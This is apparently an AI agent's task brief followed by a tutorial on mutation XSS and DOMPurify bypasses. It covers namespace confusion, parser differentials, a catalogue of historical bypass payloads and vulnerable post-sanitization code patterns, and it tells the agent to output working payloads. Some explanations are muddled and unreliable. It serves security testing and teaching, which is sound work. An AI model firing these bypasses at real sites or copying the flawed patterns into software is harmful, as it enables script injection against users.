# AGENT TASK: Mutation XSS and Parser Differential Testing
# PURPOSE: Test mXSS via namespace confusion, parser differentials, post-sanitization
# PRIORITY: Run FOURTH - advanced bypasses for specific versions/browsers
# INPUTS: DOMPurify version, target browser, post-sanitization code flow
# OUTPUT: Working mXSS payloads, parser differential findings
# CHAPTERS: 7 (mXSS Deep-Dive), 8 (Sanitization Ordering)
---

# Chapter 7: Mutation XSS (mXSS) and Browser Parser Differentials

### 7.1 Mutation XSS Defined

Mutation XSS (mXSS) exploits the fundamental property that HTML serialization followed by reparsing does not produce an identical DOM tree. Formally:

```
parse(serialize(parse(input))) != parse(input)
```

When a sanitizer parses HTML input, builds a DOM tree, removes dangerous elements and attributes, and then serializes the cleaned tree back to an HTML string, the resulting string may be parsed differently by a browser than the sanitizer intended. The differences between the sanitizer's view of the DOM and the browser's interpretation of the serialized output constitute the mutation that enables XSS.

### 7.2 Four Root Causes of mXSS

#### 7.2.1 Parser Repair Mechanisms

HTML parsers are designed to accept and "repair" malformed input. These repair mechanisms are specified by the HTML5 parsing algorithm but create predictable transformations:

**Auto-close**: The parser automatically closes elements in specific contexts. For example, `<p>` elements are auto-closed when block-level elements are encountered:

```html
<!-- Input -->
<p><div>text</div></p>
<!-- Parsed as -->
<p></p><div>text</div><p></p>
```

**Foster parenting**: Content that appears inside `<table>`, `<tbody>`, `<tr>`, or `<td>` elements but is not valid table content is "foster-parented" -- moved before the table:

```html
<!-- Input -->
<table><img src=x onerror=alert(1)><tr><td>cell</td></tr></table>
<!-- Parsed DOM: img is foster-parented before the table -->
<img src=x onerror=alert(1)>
<table><tbody><tr><td>cell</td></tr></tbody></table>
```

**Nested form collapse**: The HTML parser does not allow nested `<form>` elements. A second `<form>` encountered while a `<form>` is already open is ignored by the parser:

```html
<!-- Input -->
<form id="outer"><form id="inner"><input></form></form>
<!-- Parsed: inner form is ignored, input belongs to outer -->
<form id="outer"><input></form>
```

**Depth limits**: Some browser engines impose tree-depth limits (typically 512 elements deep). When this limit is reached, new elements are not added as children but instead are "flattened" -- added as siblings:

```html
<!-- If nesting depth exceeds 512 in Chrome/Blink -->
<!-- Elements beyond the limit become siblings, changing containment -->
```

#### 7.2.2 Serialization/Reparsing Cycles

The five-step mXSS attack flow:

1. **Attacker crafts input** that exploits a parser differential between the sanitizer's context and the browser's rendering context
2. **Sanitizer parses** the input into a DOM tree (in its own parsing context)
3. **Sanitizer validates** the DOM tree, finding no dangerous elements or attributes
4. **Sanitizer serializes** the "clean" DOM back to an HTML string via `innerHTML`/`outerHTML`/`XMLSerializer`
5. **Browser re-parses** the serialized string in a different context (rendering context), producing a different DOM tree that includes the attacker's payload

The critical vulnerability exists at step 4-5: the serialized string is a lossy representation of the DOM, and reparsing it in a different context (different scripting flag, different namespace, different depth state) produces a different tree.

#### 7.2.3 Namespace Transitions

HTML documents support three namespaces: HTML, SVG, and MathML. The parsing rules differ significantly between namespaces:

- In the HTML namespace, `<style>` is a raw text element whose content is treated as CSS text
- In the SVG namespace, `<style>` is a foreign element whose content may contain child elements
- The transition between namespaces (via SVG/MathML integration points) changes how subsequent content is parsed

```html
<!-- In SVG namespace, <style> content is parsed differently -->
<svg><style><img src=x onerror=alert(1)></style></svg>
<!-- SVG namespace: <style> can contain child elements -->
<!-- When serialized and re-parsed in HTML context: -->
<!-- <style> becomes raw text, img is hidden in CSS -->
```

#### 7.2.4 Context-Dependent Parsing

Parsing behavior depends on several context variables:

**Scripting flag**: Determines whether `<noscript>` content is parsed as raw text (scripting enabled, browser default) or as HTML elements (scripting disabled, `DOMParser` default). This difference is the basis for several mXSS attacks.

**Fragment vs. document parsing**: Fragment parsing (via `innerHTML`) uses a context element that affects parsing. Setting innerHTML on a `<div>` parses content differently than on a `<script>` or `<style>` element.

**Detached vs. attached documents**: Documents not attached to a browsing context have scripting disabled by default. `DOMParser.parseFromString()` creates detached documents, while `document.implementation.createHTMLDocument()` creates detached documents with a browsing context in some implementations.

**Browser engine differences**: Despite the HTML5 specification, browser implementations differ in edge cases related to error recovery, entity handling, and depth limits.

### 7.3 Four mXSS Categories

**Round-trip mXSS**: The DOM tree, when serialized and re-parsed, produces a structurally different tree. The sanitizer sees a safe tree, but the browser interprets the serialized output as dangerous.

**Parser differential mXSS**: The sanitizer and the browser use different parsers (or the same parser in different modes) that disagree on how to interpret ambiguous or malformed input.

**Desanitization mXSS**: Post-sanitization transformations (entity decoding, template substitution, string manipulation) reconstruct dangerous content from sanitized fragments.

**Context-dependent mXSS**: The same HTML string is parsed differently depending on the document context, scripting state, or namespace in which it is interpreted.

### 7.4 Browser Engine Differences

#### 7.4.1 Chrome/Blink

- **512-depth cap**: Chrome's HTML parser limits DOM tree depth to 512 elements. Elements pushed beyond this depth are flattened to siblings, fundamentally changing containment relationships. This was the basis for CVE-2024-47875.

- **Entity encoding in serialized attributes**: When serializing attributes via `innerHTML`, Chrome encodes certain characters as HTML entities. The serialized form may differ from the original parsed form.

- **noembed entity decoding**: Chrome decodes HTML entities within `<noembed>` elements during serialization, which can reconstruct dangerous strings from entity-encoded fragments.

- **CSS serialization escaping**: Chrome applies CSS-specific escaping rules when serializing style content, which may differ from how the sanitizer treats the same content.

- **selectedcontent (CVE-2026-47423)**: Chrome's `<selectedcontent>` element (part of the Customizable Select proposal) clones nodes from `<option>` elements into the rendering tree. This cloning operation occurs after DOMPurify sanitization and can re-introduce dangerous attributes.

#### 7.4.2 Firefox/Gecko

- **No depth flattening**: Firefox does not impose a tree-depth limit in the same way as Chrome. Deeply nested content remains nested, meaning depth-limit-based attacks that work in Chrome do not work in Firefox (and vice versa: content that is safe in Chrome because it is flattened may remain dangerous in Firefox because it stays nested).

- **noscript differences**: Firefox handles `<noscript>` content differently from Chrome in certain parsing modes. In scripting-enabled mode, Firefox treats noscript content as raw text. In DOMParser (scripting disabled), noscript content is parsed as HTML.

- **Entity decoding in noscript via DOMParser**: In Firefox's DOMParser, `<noscript>` content is parsed as HTML, meaning entity-encoded content within noscript is decoded and parsed as elements.

#### 7.4.3 Safari/WebKit

- **512-depth cap**: Safari shares Chrome's 512-depth limit for DOM tree depth.

- **`</p>` mutation in SVG**: WebKit's parser handles the `</p>` closing tag within SVG foreign content differently, causing namespace breakout. When `</p>` appears inside an SVG element, WebKit may close the SVG context and return to HTML parsing, allowing subsequent content to be interpreted as HTML.

### 7.5 Fragment Parsing Context vs. Document Parsing

Fragment parsing via `innerHTML` uses a context element that determines the initial parser state:

```javascript
// Fragment parsing -- context element affects parsing
div.innerHTML = input;  // Context: <div> (ordinary element)
// Parser starts in "in body" mode

td.innerHTML = input;   // Context: <td> (table cell)
// Parser starts in "in cell" mode

script.innerHTML = input; // Context: <script> (raw text)
// Content is treated as raw text, not parsed as HTML
```

Document parsing via `DOMParser.parseFromString()` creates a full document without a context element:

```javascript
// Document parsing -- no context element, full document mode
var doc = new DOMParser().parseFromString(input, 'text/html');
// Parser starts in "initial" mode, processes DOCTYPE, <html>, <head>, <body>
// Scripting flag is DISABLED (critical difference from browser rendering)
```

The difference matters because DOMPurify uses fragment parsing (setting innerHTML on a template or body element), while the final rendering may use the browser's full document parser or a different fragment context.

### 7.6 Detached Document Parsing

DOMPurify creates a detached document (via `document.implementation.createHTMLDocument('')`) for its sanitization work. Detached documents have the scripting flag set to "disabled" because they are not associated with a browsing context.

This means:
- `<noscript>` content is parsed as HTML in the sanitizer's document
- `<noscript>` content is parsed as raw text in the browser's rendering context (scripting enabled)
- Content visible to the sanitizer inside `<noscript>` is invisible to the browser, and vice versa

```html
<!-- Input -->
<noscript><img src=x onerror=alert(1)></noscript>

<!-- DOMPurify's view (scripting disabled): -->
<!-- noscript contains child element <img> with onerror -- BLOCKED -->

<!-- But consider: -->
<noscript>&lt;img src=x onerror=alert(1)&gt;</noscript>
<!-- DOMPurify's view (scripting disabled): -->
<!-- noscript contains text node "&lt;img..." -- SAFE -->
<!-- Browser's view (scripting enabled): -->
<!-- noscript content is raw text: "<img src=x onerror=alert(1)>" -->
<!-- Displayed as text, not parsed as HTML -- also safe in this case -->

<!-- The dangerous case involves interaction with other elements: -->
<noscript><p></noscript><img src=x onerror=alert(1)>
<!-- DOMPurify: <noscript> contains <p>, then </noscript> closes noscript -->
<!-- img is OUTSIDE noscript, gets sanitized -->
<!-- Browser (scripting on): noscript raw text consumes everything until </noscript> -->
<!-- Different tree structure -->
```

### 7.7 HTML5 Foreign Content Parsing

#### 7.7.1 Integration Points

The HTML5 specification defines specific elements as "integration points" where the parser switches from foreign content (SVG/MathML) back to HTML parsing:

**MathML text integration points**: `mi`, `mo`, `mn`, `ms`, `mtext` -- these elements in MathML namespace cause their children to be parsed as HTML (with certain exceptions).

**HTML integration points**: `SVG foreignObject`, `SVG desc`, `SVG title`, and `MathML annotation-xml` (when its encoding attribute contains "text/html" or "application/xhtml+xml") -- these cause children to be parsed in the HTML namespace.

**Namespace switching rules**: When a start tag for an HTML element is encountered inside a foreign content context (SVG or MathML), the parser checks whether the current element is an integration point. If so, the new element is processed in the HTML namespace.

#### 7.7.2 Raw Text vs. Foreign Content Behavior

In the HTML namespace, certain elements (`script`, `style`, `textarea`, `title`, `noscript`, `noframes`, `noembed`) are raw text or escapable raw text elements whose content is not parsed as HTML.

In the SVG/MathML namespace, the same tag names do not have this raw text behavior. `<style>` inside SVG parses its content as child elements, not as raw text.

This difference is fundamental to many mXSS attacks: content that is raw text in one namespace becomes parsed HTML in another.

### 7.8 Historical DOMPurify Bypasses (2007-2026)

#### 7.8.1 Hasegawa 2007 -- IE Backtick

The earliest documented mutation-based bypass, Yosuke Hasegawa demonstrated that Internet Explorer treated backticks as attribute delimiters:

```html
<!-- IE treated backtick as attribute delimiter -->
<img src=`x`onerror=alert(1)>
<!-- IE parsed: src=`x` onerror=alert(1) -->
<!-- Other browsers: src=`x`onerror=alert(1) (single attribute) -->
```

#### 7.8.2 Heiderich 2011 -- Firefox SVG

Mario Heiderich demonstrated mXSS through Firefox's SVG handling, where SVG content was serialized differently than it was parsed, enabling reconstruction of script content through serialization/reparsing cycles.

#### 7.8.3 Heyes 2014/2018 -- IE/Edge

Gareth Heyes demonstrated multiple mXSS vectors in Internet Explorer and Microsoft Edge, exploiting their HTML parsers' non-standard error recovery behavior and differences in entity handling.

#### 7.8.4 Kinugawa 2019 -- noscript Scripting Flag + Google Closure

Masato Kinugawa exploited the fundamental `<noscript>` scripting flag differential. DOMPurify parsed content in a detached document (scripting disabled), so noscript content was parsed as HTML. The browser rendered it with scripting enabled, treating noscript content as raw text.

Combined with Google Closure library's sanitizer, the attack used noscript to hide content from the sanitizer that would be visible (and dangerous) in the browser context.

#### 7.8.5 SecurityMB 2019 -- SVG `</p>` + Style Namespace Confusion

Michal Bentkowski (SecurityMB) discovered that `</p>` within SVG foreign content triggered a namespace breakout in certain browsers. The closing `</p>` tag caused the parser to exit SVG context and return to HTML parsing:

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

The attack exploited:
1. `</p>` causes namespace exit from SVG to HTML in WebKit/Blink
2. `<style>` in HTML namespace is raw text (content not parsed as HTML)
3. The `id` attribute value containing `</style>` is treated as CSS text
4. When serialized and re-parsed, the `</style>` in the attribute closes the style element
5. The subsequent `<img>` tag with `onerror` executes JavaScript

This led to WHATWG issue #5113 discussing the `</p>` behavior in foreign content.

#### 7.8.6 SecurityMB 2020 -- MathML mtext/mglyph + Nested Forms (CVE-2020-26870)

Bentkowski discovered a bypass using MathML text integration points combined with nested form elements:

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style>
```

The attack exploited:
1. `<mtext>` is a MathML text integration point (children parsed as HTML)
2. `<table>` inside mtext triggers foster parenting for non-table content
3. `<mglyph>` in certain positions affected the namespace context
4. `<style>` parsing differed between the sanitizer and browser due to namespace confusion
5. Nested form behavior altered DOM structure

#### 7.8.7 vovohelo 2020 -- SVG to MathML to HTML Chain

This bypass used a three-level namespace chain: SVG -> MathML -> HTML, exploiting the transitions between all three namespaces:

```html
<svg><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

Each namespace transition created a potential parsing differential.

#### 7.8.8 Kinugawa -- Forbidden Tag Children Bypass

Masato Kinugawa found that DOMPurify's handling of "forbidden" tags (tags in FORBID_TAGS) had an edge case where the children of forbidden tags were preserved when they should have been removed, allowing content to escape containment.

#### 7.8.9 Kevin Mizu 2024 -- CUSTOM_ELEMENT + Empty FORBID_CONTENTS

Kevin Mizu discovered that when `CUSTOM_ELEMENT_HANDLING` was enabled with an empty `FORBID_CONTENTS` configuration, DOMPurify would allow custom elements whose content was not sanitized, effectively bypassing all content restrictions within custom elements.

```javascript
DOMPurify.sanitize(input, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /^my-/,
    attributeNameCheck: /^data-/,
    allowCustomizedBuiltInElements: true,
  },
  FORBID_CONTENTS: {} // Empty object disables content forbidding!
});
```

#### 7.8.10 icesfont 2024 -- Nesting Depth Flattening (CVE-2024-47875)

This bypass exploited Chrome/Blink's 512-element tree depth limit:

1. Craft input with 512+ levels of nesting (e.g., nested `<div>` elements)
2. DOMPurify parses this into a deeply nested tree
3. A dangerous element (e.g., `<style>` containing XSS) is placed at the bottom of the nesting
4. The sanitizer sees the `<style>` as deeply nested within safe `<div>` elements
5. When serialized and re-parsed by Chrome, the depth limit causes flattening
6. The flattened `<style>` element becomes a sibling of its former ancestors
7. Content that was safely contained within the `<style>` in the sanitizer's view is now in a different parsing context in the browser

```html
<!-- 512+ nested divs, then: -->
<div>...<div><style><!--</style><img src=x onerror=alert(1)>--></style></div>...</div>
<!-- After Chrome's depth flattening, <style> and <img> become siblings -->
<!-- of outer divs, changing the parsing context -->
```

#### 7.8.11 mizu.re 2024 -- DOM Clobbering parentNode Depth Counter

This bypass used DOM clobbering to interfere with DOMPurify's internal depth tracking. By clobbering the `parentNode` property, the depth counter could be made to report incorrect values, causing DOMPurify to miscount nesting depth and misapply depth-dependent rules.

#### 7.8.12 ryotkak/mizu.re 2024 -- Second-Order Clobbering + Elevator Mutation

A sophisticated two-stage attack combining DOM clobbering with the "elevator mutation" technique. The first stage clobbers internal references, and the second stage exploits the resulting confusion to mutate elements across namespace boundaries.

#### 7.8.13 CVE-2024-45801 -- Prototype Pollution + Depth Check

This vulnerability combined prototype pollution with depth check manipulation. By polluting `Object.prototype` with specific properties, attackers could cause DOMPurify's depth tracking to malfunction, effectively neutralizing the depth-based protections added after CVE-2024-47875.

#### 7.8.14 CVE-2025-26791 -- Template Expression Reassembly

This CVE exploited DOMPurify's `SAFE_FOR_TEMPLATES` mode. Template expressions (such as `{{`, `}}`, `<%`, `%>`) were stripped by the sanitizer, but the fragments remaining after stripping could be reassembled by post-processing steps:

```html
<!-- Input with template expressions split across attributes -->
<div data-x="{{" data-y="constructor.constructor('alert(1)')()}}">
<!-- SAFE_FOR_TEMPLATES strips {{ and }} -->
<!-- But when attributes are concatenated in post-processing, -->
<!-- the template expression is reassembled -->
```

#### 7.8.15 CVE-2026-3126 -- Re-contextualization

This vulnerability exploited context changes during sanitization. Content sanitized in one parsing context (e.g., as a fragment within a `<div>`) was later rendered in a different context (e.g., within a `<select>` element or in an SVG context), where different parsing rules applied.

#### 7.8.16 CVE-2026-41238 -- Prototype Pollution Config Fallback

When DOMPurify's configuration lookup used prototype chain traversal for config values, prototype pollution could inject configuration options that weakened security:

```javascript
// Prototype pollution injects configuration
Object.prototype.ALLOW_UNKNOWN_PROTOCOLS = true;
Object.prototype.WHOLE_DOCUMENT = true;

// DOMPurify reads these from the prototype chain
// when they are not explicitly set in the config
DOMPurify.sanitize(input, {}); // Uses polluted config values
```

#### 7.8.17 CVE-2026-47423 -- selectedcontent Re-clone

The `<selectedcontent>` element (part of Chrome's Customizable Select implementation) performs a clone of the selected `<option>`'s content into the rendering tree. This clone operation:

1. Occurs after DOMPurify has sanitized the content
2. Copies event handler attributes that DOMPurify may have removed from the original elements
3. Re-attaches nodes in a different DOM context where DOMPurify's modifications do not apply

```html
<select>
  <option><img src=x onerror="alert(1)"></option>
  <selectedcontent></selectedcontent>
</select>
<!-- DOMPurify removes onerror from the img in <option> -->
<!-- But selectedcontent clones the ORIGINAL option content -->
<!-- The clone includes the onerror handler -->
```

### 7.9 Namespace Transition Attacks

#### 7.9.1 SVG-to-HTML Breakouts

**`</p>` mutation**: The `</p>` closing tag inside SVG foreign content triggers an "Any other end tag" rule in some browsers that causes them to exit SVG and return to HTML parsing. This is not universally consistent across browser engines.

**HTML integration points**: `<foreignObject>`, `<desc>`, and `<title>` within SVG are HTML integration points. Content within these elements is parsed in the HTML namespace:

```html
<svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>
<!-- Content inside foreignObject is parsed as HTML -->
```

**Style namespace confusion**: `<style>` elements behave differently in SVG vs. HTML namespace. In HTML, `<style>` content is raw text. In SVG, it is not:

```html
<svg><style><img src=x onerror=alert(1)></style></svg>
<!-- In SVG namespace: <img> is parsed as a child element of <style> -->
<!-- Sanitizer may see it as HTML (safe in style) or SVG (visible as element) -->
```

#### 7.9.2 MathML-to-HTML Breakouts

**Text integration points**: `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` in MathML namespace cause children to be parsed as HTML elements:

```html
<math><mtext><img src=x onerror=alert(1)></mtext></math>
<!-- Content inside mtext is parsed as HTML -->
```

**annotation-xml**: When `annotation-xml` has an `encoding` attribute of `text/html` or `application/xhtml+xml`, it becomes an HTML integration point:

```html
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
```

#### 7.9.3 CDATA Handling Differences

CDATA sections (`<![CDATA[...]]>`) are handled differently in HTML vs. SVG/MathML contexts. In HTML, CDATA is treated as a comment. In SVG/MathML (foreign content), CDATA content is treated as text. This difference can be exploited when content moves between namespaces.

#### 7.9.4 Elevator Mutation

The "elevator" technique moves content between namespace levels through specific parser behaviors at integration points:

```html
<math><mtext><table><mglyph><style>
<!-- Content here is "elevated" through multiple namespace transitions -->
<!-- mtext: MathML text integration point (children as HTML) -->
<!-- table: triggers foster parenting -->
<!-- mglyph: namespace-sensitive element -->
<!-- style: raw text in HTML, child elements in SVG/MathML -->
</style></mglyph></table></mtext></math>
```

#### 7.9.5 Double mtext Bypass

Using nested mtext elements to create ambiguous namespace contexts:

```html
<math><mtext><mtext><style><img src=x onerror=alert(1)></style></mtext></mtext></math>
<!-- The second mtext creates an additional integration point -->
<!-- This can confuse parsers about which namespace applies to <style> -->
```

### 7.10 Why DOMPurify's Detached Document Approach Fails

DOMPurify uses a detached document for sanitization. This approach fails for five fundamental reasons:

1. **Scripting flag mismatch**: The detached document has scripting disabled, while the browser's rendering context has scripting enabled. This causes different parsing of `<noscript>`, `<noembed>`, and other scripting-dependent elements.

2. **No depth limits in some parsers**: The detached document's parser may not enforce the same depth limits as the browser's parser. Content that is deeply nested in the sanitizer's view may be flattened in the browser, changing containment relationships.

3. **Serialization is lossy**: Converting the sanitized DOM tree back to a string via `innerHTML` loses information about parsing context, namespace state, and tree structure nuances. The serialized string is necessarily a simplified representation.

4. **Parser version differences**: The sanitizer's parser and the browser's parser may differ (especially in server-side usage with jsdom/linkedom/happy-dom), leading to different interpretations of the same HTML string.

5. **Context-dependent elements**: Elements whose behavior depends on their position in the document (table content, form elements, select/option) may be parsed differently in the detached document's fragment context vs. the browser's full document context.

### 7.11 Mitigation: RETURN_DOM_FRAGMENT

Using `RETURN_DOM_FRAGMENT: true` in DOMPurify's configuration avoids the serialize/reparse cycle that is the root cause of most mXSS attacks:

```javascript
// Instead of:
element.innerHTML = DOMPurify.sanitize(input);
// Which: parse -> sanitize -> serialize -> reparse (mXSS risk!)

// Use:
const fragment = DOMPurify.sanitize(input, { RETURN_DOM_FRAGMENT: true });
element.appendChild(fragment);
// Which: parse -> sanitize -> move nodes (no serialization/reparsing!)
```

By returning a `DocumentFragment` and using `appendChild` (or `replaceChildren`), the sanitized DOM nodes are moved directly into the document without serialization. This eliminates the serialize/reparse cycle and with it the primary mechanism for mXSS.

However, this approach has limitations:
- Cannot be used in server-side contexts where HTML must be transmitted as a string
- Requires changing how the application inserts content (from `innerHTML` to `appendChild`)
- Does not protect against parser differential attacks that occur during the initial parse

---

# Chapter 8: Sanitization Ordering and Postprocessing Vulnerabilities

The golden rule of DOMPurify usage: **Never modify DOMPurify's output.** Every transformation applied after sanitization is a potential XSS vector because the transformation's output is never re-validated by the sanitizer.

This chapter catalogs 16 post-sanitization transformation failure patterns, each representing a distinct class of vulnerability.

### 8.1 Pattern A1: Sanitize then Concatenate

**Description**: Sanitized HTML fragments are concatenated with other strings or HTML fragments, creating cross-boundary elements that span the boundary between sanitized and unsanitized content.

```javascript
// VULNERABLE: String injection at concatenation boundary
function renderComment(username, body) {
  const safeBody = DOMPurify.sanitize(body);
  // Username is not sanitized!
  return `<div class="comment">
    <span class="author">${username}</span>
    <div class="body">${safeBody}</div>
  </div>`;
}

// Attack: username = '</span><img src=x onerror=alert(1)><span>'
// Cross-boundary element creation
renderComment('</span><img src=x onerror=alert(1)><span>', 'hello');
// Result: <div class="comment">
//   <span class="author"></span><img src=x onerror=alert(1)><span></span>
//   <div class="body">hello</div>
// </div>
```

```javascript
// VULNERABLE: Concatenating multiple sanitized fragments
function renderThread(comments) {
  return comments.map(c => DOMPurify.sanitize(c)).join('');
  // Each fragment is sanitized individually
  // But join creates a single string that is never re-validated
  // Cross-fragment element creation is possible
}

// Attack: Two comments that combine to form a dangerous element
// comment1: '<img src="x" '
// comment2: 'onerror="alert(1)">'
// After join: '<img src="x" onerror="alert(1)">'
// DOMPurify would strip onerror if it saw the whole thing
```

### 8.2 Pattern A2: Sanitize then Decode

**Description**: HTML entity decoding or URL decoding applied after sanitization reconstructs dangerous markup from entity-encoded fragments.

```javascript
// VULNERABLE: Entity decoding after sanitization
function displayContent(input) {
  let clean = DOMPurify.sanitize(input);
  // "Improve readability" by decoding entities
  const textarea = document.createElement('textarea');
  textarea.innerHTML = clean;
  return textarea.value; // Entities decoded!
}

// Input:  &lt;img src=x onerror=alert(1)&gt;
// After sanitize: &lt;img src=x onerror=alert(1)&gt; (safe text)
// After decode: <img src=x onerror=alert(1)> (dangerous HTML!)
```

Real-world examples:
- **Curiosus.Utils issue #61**: Entity decoding function applied to sanitized output
- **SE-Dashboard issue #312**: URL decoding of sanitized content re-introduced `javascript:` URIs
- **braintree/sanitize-url issue #40**: Double-decoding of URLs allowed `javascript:` protocol bypass

```javascript
// URL decoding after sanitization (braintree/sanitize-url pattern)
function sanitizeUrl(url) {
  let clean = DOMPurify.sanitize(`<a href="${url}">`, { RETURN_DOM: true })
    .querySelector('a').getAttribute('href');
  // URL-decode "for normalization"
  return decodeURIComponent(clean);
}

// Input: java%73cript:alert(1)
// After sanitize: javascript: is blocked, href removed
// But with double-encoding: java%2573cript:alert(1)
// First decode by browser: java%73cript:alert(1)
// After sanitize: java%73cript:alert(1) passes (not javascript:)
// After decodeURIComponent: javascript:alert(1)
```

### 8.3 Pattern A3: Sanitize then Template Substitution

**Description**: Template expressions or placeholders are replaced with unsanitized values after DOMPurify has processed the template, allowing injection through template variables.

```javascript
// VULNERABLE: Template substitution after sanitization
function renderTemplate(template, data) {
  const cleanTemplate = DOMPurify.sanitize(template);
  return cleanTemplate.replace(/\{\{(\w+)\}\}/g, (match, key) => {
    return data[key] || ''; // Substituted values are NOT sanitized!
  });
}

// Attack: template = '<div>Hello {{name}}</div>'  (safe after sanitize)
// data = { name: '<img src=x onerror=alert(1)>' }
// Result: '<div>Hello <img src=x onerror=alert(1)></div>'
```

**CVE-2025-26791**: Template expression reassembly vulnerability where `SAFE_FOR_TEMPLATES` mode stripped `{{` and `}}` delimiters, but the remaining content could be reassembled by post-processing.

**CVE-2026-65900**: A variant where template expressions split across HTML attributes survived sanitization and were reassembled by the template engine.

DOMPurify's `SAFE_FOR_TEMPLATES` option is explicitly described as a "last resort" because it cannot protect against all template injection scenarios. It strips template delimiters (`{{`, `}}`, `<%`, `%>`) but:
- Cannot prevent reassembly from multiple fragments
- Does not understand the template engine's full syntax
- May miss template expressions in non-obvious locations (attribute values, CSS)

### 8.4 Pattern A4: Sanitize then Markdown Conversion

**Description**: Converting sanitized HTML to Markdown or converting Markdown that was sanitized as HTML results in lossy round-trips that re-introduce dangerous content.

```javascript
// VULNERABLE: Sanitize HTML, then convert to Markdown, then back to HTML
function processContent(input) {
  const cleanHtml = DOMPurify.sanitize(input);
  const markdown = htmlToMarkdown(cleanHtml);
  // Later, render markdown back to HTML without sanitizing
  return markdownToHtml(markdown);
}

// CommonMark raw HTML blocks pass through markdown renderers:
// If the markdown contains raw HTML blocks, they are preserved
// markdownToHtml('<script>alert(1)</script>') may output the script

// javascript: in link destinations:
// Markdown: [click](javascript:alert(1))
// Some renderers output: <a href="javascript:alert(1)">click</a>
```

### 8.5 Pattern A5: Sanitize then DOM Mutation

**Description**: DOM mutations applied after sanitization modify the tree in ways that introduce dangerous content.

```javascript
// VULNERABLE: DOM mutation after sanitization
function enhanceContent(input) {
  const clean = DOMPurify.sanitize(input, { RETURN_DOM: true });
  // Add "interactive" features after sanitization
  clean.querySelectorAll('a').forEach(a => {
    a.setAttribute('onclick', `track('${a.href}')`);
    // oops: a.href may contain quotes that break out of the string
  });
  return clean.innerHTML;
}
```

**CVE-2026-47423 (selectedcontent)**: Chrome's `<selectedcontent>` element performs a DOM clone operation after sanitization. The cloned nodes are taken from the original option elements, not from the sanitized versions, re-introducing removed attributes.

**Declarative partial updates / patchsrc**: Frameworks that apply partial DOM updates (patching) after sanitization may re-introduce content that the sanitizer removed if the patch is computed against the pre-sanitization DOM.

### 8.6 Pattern A6: Sanitize then setAttribute

**Description**: Attributes added via `setAttribute` after sanitization bypass DOMPurify's attribute validation.

```javascript
// VULNERABLE: setAttribute after sanitization
function addTracking(input) {
  const fragment = DOMPurify.sanitize(input, { RETURN_DOM_FRAGMENT: true });
  fragment.querySelectorAll('*').forEach(el => {
    // Copy data attributes from a user-controlled source
    const trackData = getUserTrackingData(el.id);
    for (const [key, value] of Object.entries(trackData)) {
      el.setAttribute(key, value); // No validation!
      // key could be 'onmouseover', value could be 'alert(1)'
    }
  });
  return fragment;
}
```

This pattern also manifests through hooks:
- `forceKeepAttr` in `uponSanitizeAttribute` bypasses all attribute validation
- `afterSanitizeAttributes` hook adding attributes via `setAttribute` bypasses validation
- Unicode ligature attacks in `afterSanitizeAttributes` (section 6.5)

### 8.7 Pattern A7: Sanitize then Rewrite URLs

**Description**: URL rewriting applied after sanitization can introduce open redirects or dangerous protocols.

```javascript
// VULNERABLE: URL rewriting after sanitization
function rewriteLinks(input) {
  const clean = DOMPurify.sanitize(input, { RETURN_DOM: true });
  clean.querySelectorAll('a[href]').forEach(a => {
    const href = a.getAttribute('href');
    // Prepend domain for "relative" URLs
    if (!href.startsWith('https://')) {
      a.setAttribute('href', 'https://example.com/' + href);
    }
  });
  return clean.innerHTML;
}

// Attack: href = "javascript:alert(1)"
// startsWith('https://') is false
// Result: 'https://example.com/javascript:alert(1)' -- in this case actually safe
// But: href = '//evil.com/redirect?url=javascript:alert(1)'
// startsWith('https://') is false
// Result: 'https://example.com///evil.com/...' -- complex redirect

// More dangerous: startsWith bypass
// href = 'https://evil.com\@example.com/path'
// startsWith('https://') is true
// URL actually points to evil.com with example.com as auth portion
```

### 8.8 Pattern A8: Sanitize then Serialize then Reparse

**Description**: The fundamental mXSS pattern. The sanitized DOM is serialized back to HTML and then re-parsed by the browser, producing a different tree.

```javascript
// VULNERABLE: serialize/reparse cycle (most common DOMPurify usage)
element.innerHTML = DOMPurify.sanitize(input);
// Internally: parse -> sanitize -> serialize (innerHTML getter) -> assign to innerHTML -> reparse
```

This is not a wrapper antipattern per se but the inherent risk of DOMPurify's default string output mode. The specific attack vectors include:

- **Parser repair**: Auto-close, foster parenting, form nesting collapse
- **Namespace confusion**: SVG/MathML integration points, style/script namespace behavior
- **Depth-limit flattening**: Chrome/Safari 512-element depth cap (CVE-2024-47875)
- **Context switching**: Scripting flag differences (noscript), fragment vs. document parsing
- **SecurityMB 2019**: `</p>` in SVG causing namespace exit, style content reinterpretation

### 8.9 Pattern A9: Sanitize then HTML Reconstruction

**Description**: Reconstructing HTML from extracted content, such as reading cell values from a table and rebuilding the table with different markup.

```javascript
// VULNERABLE: Extracting and reconstructing table content
function reformatTable(input) {
  const clean = DOMPurify.sanitize(input, { RETURN_DOM: true });
  const rows = clean.querySelectorAll('tr');
  let html = '<table class="formatted">';
  rows.forEach(row => {
    html += '<tr>';
    row.querySelectorAll('td').forEach(cell => {
      // cell.innerHTML is the sanitized cell content
      // But wrapping it in new HTML creates new parsing context
      html += `<td class="cell">${cell.innerHTML}</td>`;
    });
    html += '</tr>';
  });
  html += '</table>';
  return html; // Reconstructed HTML is never re-sanitized
}

// Attack: cell content that is safe within a td but dangerous when
// concatenated into a new HTML string (cross-cell injection)
// cell1: '<img src="x" '
// cell2: 'onerror="alert(1)">'
```

### 8.10 Pattern A10: Sanitize then Plugin Modification

**Description**: Third-party plugins or libraries modify sanitized content in ways that re-introduce vulnerabilities.

```javascript
// TinyMCE BOM removal (CVE-2023-48219)
// TinyMCE's content processing removes BOM characters (U+FEFF)
// from sanitized content. If DOMPurify relied on the BOM's presence
// within element names or attribute values as a parsing barrier,
// its removal reconstructs dangerous content.
```

**jQuery (CVE-2020-11022)**: jQuery's `.html()` method rewrites self-closing tags (e.g., `<div/>`) to opening tags, changing how the parser interprets subsequent content:

```javascript
// jQuery rewrites self-closing tags
$('#target').html('<div/>content');
// jQuery transforms to: <div>content</div>
// This changes containment -- content is now INSIDE the div
// Combined with sanitized content, this changes parser context
```

